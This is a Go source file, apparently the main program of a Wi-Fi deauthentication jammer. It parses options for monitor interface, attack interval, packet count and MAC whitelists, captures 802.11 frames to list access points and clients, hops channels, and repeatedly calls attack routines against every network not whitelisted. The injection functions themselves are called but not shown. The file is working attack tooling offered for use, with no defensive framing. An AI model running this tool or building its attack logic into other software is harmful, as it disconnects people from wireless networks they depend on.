package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/dauie/go-netlink/nl80211"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/jessevdk/go-flags"
	"github.com/jroimartin/gocui"
)

/*TODO*/
// 5. add "stats" view to the top of gui and "stats" printout at program's end

type Opts				struct {
	DumpDuration		uint32	`short:"m" long:"monitor" default:"0" description:"specify an amount of time in seconds to monitor, at the end a list of APs and clients will be displayed"`
	MonitorInterface	string	`short:"i" long:"interface" required:"true" description:"name of interface that will be used for monitoring and injecting frames (e.g wlan0)"`
	ClientWhiteList		string	`short:"c" long:"clientwlist" description:"file with new line separated list of client MACs to be spared"`
	APWhiteList			string	`short:"a" long:"apwlist" description:"file with new line separated list of AP MACs to be spared"`
	GuiMode				bool	`short:"g" long:"gui" description:"enable gui mode for manual control"`
	APScanInterval		uint32	`short:"s" long:"scaninterval" default:"60" description:"the interval between ap scans in seconds"`
	AttackInterval		uint32	`short:"t" long:"attackinterval" default:"10" description:"the interval between attacks in seconds"`
	AttackCount			uint16	`short:"p" long:"attackcount" default:"5" description:"the amount of packets to be sent during each attack"`
	ChanChangeInterval	uint32	`short:"f" long:"channinterval" default:"3" description:"the interval between channel switches in milliseconds"`
}

var (
	StatsG			Stats
	OptsG			Opts
	MonIfaG			*JamConn
	APWListG		*List		//key: mac[:16] value: mac
	APWListMutexG	sync.Mutex
	CliWListG		*List		//key: mac value: mac
	CliWListMutexG	sync.Mutex
	APListG			*List		//key: mac[:16] value: AP
	APListMutexG	sync.Mutex
	CliListG		*List		//key: mac value: Client
	CliListMutexG	sync.Mutex
	GuiG			*gocui.Gui
	QuitG			= false
)

func	handleSigInt() {

	sigc := make(chan os.Signal, 1)

	go func () {
		s := <-sigc
		if s == syscall.SIGINT {
			QuitG = true
		}
	}()
	signal.Notify(sigc, syscall.SIGINT)
}

func	checkComms(apList *List, cliList *List, cliWList *List, pkt gopacket.Packet) {

	var cli			*Client
	var ap			AP
	var cliAddr		net.HardwareAddr
	var apAddr		net.HardwareAddr
	var fromClient	= false

	if pkt == nil {
		return
	}
	radioTap := pkt.Layer(layers.LayerTypeRadioTap)
	dot11 := pkt.Layer(layers.LayerTypeDot11)
	if dot11 == nil || radioTap == nil {
		return
	}
	tap := radioTap.(*layers.RadioTap)
	dot := dot11.(*layers.Dot11)
	// did the message originate from the client?
	if dot.Address1.String() != dot.Address3.String() {
		cliAddr = dot.Address1
		apAddr = dot.Address2
		fromClient = true
	} else {
		apAddr = dot.Address1
		cliAddr = dot.Address2
	}
	// is the client whitelisted?
	CliWListMutexG.Lock()
	if _, ok := cliWList.Get(cliAddr.String()); ok {
		CliWListMutexG.Unlock()
		return
	}
	CliWListMutexG.Unlock()
	// is the ap on our target list?
	APListMutexG.Lock()
	if a, ok := apList.Get(apKey(apAddr.String())); ok {
		ap = (a).(AP)
	} else {
		APListMutexG.Unlock()
		return
	}
	APListMutexG.Unlock()
	// have we seen this client before?
	CliListMutexG.Lock()
	if v, ok := cliList.Get(cliAddr.String()); ok {
		cli = (v).(*Client)
	} else {
		cli = new(Client)
		cli.hwaddr = cliAddr
	}
	CliListMutexG.Unlock()
	if fromClient {
		cli.dot = *dot
		cli.tap = *tap
		cli.nPktTx += 1
		ap.nPktRx += 1
	} else {
		ap.dot = *dot
		ap.tap = *tap
		cli.nPktRx += 1
		ap.nPktTx += 1
	}
	StatsG.nPktMon += 1
	StatsG.nByteMon += uint64(len(pkt.Data()))
	CliListMutexG.Lock()
	cliList.Add(cli.hwaddr.String(), cli)
	CliListMutexG.Unlock()
	ap.AddClient(cli)
	APListMutexG.Lock()
	apList.Add(apKey(ap.hwaddr.String()), ap)
	APListMutexG.Unlock()
}

func	getWhiteLists(opts *Opts) (cliList List, apList List) {

	apWList, err := getListFromFile(opts.APWhiteList, apKey)
	if err != nil {
		log.Fatalln("getListFromFile()", err)
	}
	cliWList, err := getListFromFile(opts.ClientWhiteList, nil)
	if err != nil {
		log.Fatalln("getListFromFile()", err)
	}
	return cliWList, apWList
}

func	guiMode(monIfa *JamConn, apList *List, cliList *List, apWList *List, cliWList *List) {

	MonIfaG = monIfa
	APWListG = apWList
	CliWListG = cliWList
	APListG = apList
	CliListG = cliList

	gui, err := initGui()
	if err != nil {
		log.Panicln(err)
	}
	defer gui.Close()
	GuiG = gui
	gui.SetManagerFunc(goJamGui)
	if err := keybindings(gui); err != nil {
		log.Panicln(err)
	}
	go goJamLoop(MonIfaG, APListG, CliListG, APWListG, CliWListG)
	go doEvery(time.Millisecond * 200, updateViews)
	if err := gui.MainLoop(); err != nil && err != gocui.ErrQuit {
		log.Panicln(err)
	}
}

func	goJamLoop(monIfa *JamConn, apList *List, cliList *List, apWList *List, cliWList *List) {

	packSrc := gopacket.NewPacketSource(monIfa.handle, monIfa.handle.LinkType())

	for !QuitG {
		packet, err := packSrc.NextPacket()
		if err != nil {
			switch err.Error() {
			case "Read Error":
				log.Panicln("gopacket.PacketSource.NextPacket()", err,
					"\ndevice possibly disconnected or removed from monitor mode")
				break
			case "Timeout Expired":
				break
			case "EOF":
				QuitG = true
				break
			default:
				log.Panicln("packSrc.NextPacket()", err)
				break
			}
		} else {
			checkComms(apList, cliList, cliWList, packet)
		}
		monIfa.AttackIfPast(time.Second * time.Duration(OptsG.AttackInterval), OptsG.AttackCount, apList)
		monIfa.ChangeChanIfPast(time.Second * time.Duration(OptsG.ChanChangeInterval))
		if OptsG.APScanInterval > 0 {
			monIfa.DoAPScanIfPast(time.Second * time.Duration(OptsG.APScanInterval), apWList, apList)
		}
	}
}

func	initEnv() {

	// check for sudo privileges
	user := os.Geteuid()
	if user != 0 {
		fmt.Printf("admin privledges are required for %s run 'sudo %s [options]'\n", (os.Args[0])[2:], (os.Args[0])[2:])
		os.Exit(1)
	}
	// add 2.4Ghz band to active channels.
	for e, v := range ChanArrG {
		if e < 13 {
			ActiveChanArrG = append(ActiveChanArrG, v)
		}
	}
	//set rand seed
	rand.Seed(time.Now().UTC().UnixNano())
	//catch sigint
	handleSigInt()
}

func	main() {

	var apList		List
	var apWList		List
	var cliList		List
	var cliWList	List

	initEnv()
	if _, err := flags.ParseArgs(&OptsG, os.Args); err != nil {
		os.Exit(1)
	}
	cliWList, apWList = getWhiteLists(&OptsG)
	monIfa, err := NewJamConn(OptsG.MonitorInterface)
	if err != nil {
		log.Fatalln("NewJamConn()", err)
	}
	defer func() {
		if err := monIfa.nlconn.Close(); err != nil {
			log.Fatalln("genetlink.Conn.Close()", err)
		}
	}()
	if err := monIfa.DoAPScan(&apWList, &apList); err != nil {
		log.Fatalln("JamConn.DoAPScan()", err)
	}
	defer func() {
		if err := monIfa.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
			log.Fatalln("JamConn.SetIfaType()", err.Error())
		}
	}()
	if err := monIfa.SetupPcapHandle(); err != nil {
		log.Fatalln("setupPcapHandle() ", err)
	}
	defer monIfa.handle.Close()
	if err := monIfa.SetFilterForTargets(); err != nil {
		log.Fatalln("JamConn.SetFilterForTargets()", err)
	}
	if err := monIfa.SetRandChannel(); err != nil {
		log.Fatalln("JamConn.SetRandChannel() " + err.Error())
	}
	monIfa.SetLastDeauth(time.Now())
	StatsG.SetSessionStart(time.Now())
	if OptsG.DumpDuration > 0 {
		monitorDump(monIfa, &apList, &cliList, &apWList, &cliWList)
	} else if OptsG.GuiMode {
		guiMode(monIfa, &apList, &cliList, &apWList, &cliWList)
	} else {
		goJamLoop(monIfa, &apList, &cliList, &apWList, &cliWList)
	}
	StatsG.SetSessionEnd(time.Now())
}
